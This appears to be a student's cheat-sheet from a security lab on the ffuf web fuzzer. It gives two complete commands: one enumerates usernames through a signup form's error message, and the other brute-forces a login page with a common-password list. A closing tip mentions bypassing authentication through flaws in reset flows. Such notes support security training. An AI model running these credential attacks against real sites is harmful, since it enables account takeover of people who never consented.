"Fuzz Faster U Fool"

Username Enum:
`ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"`

-X: request method
-d: data to send (with FUZZ)
-H: additional headers
-mr: returned content filter

`ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200`

:W1,:W2 - specify parameters 
-fc: returned response code filter

Logic Flaw: 
Inspect implementations, manipulate requests, and use other links (password / email resets, etc.) to jump intended path of execution. 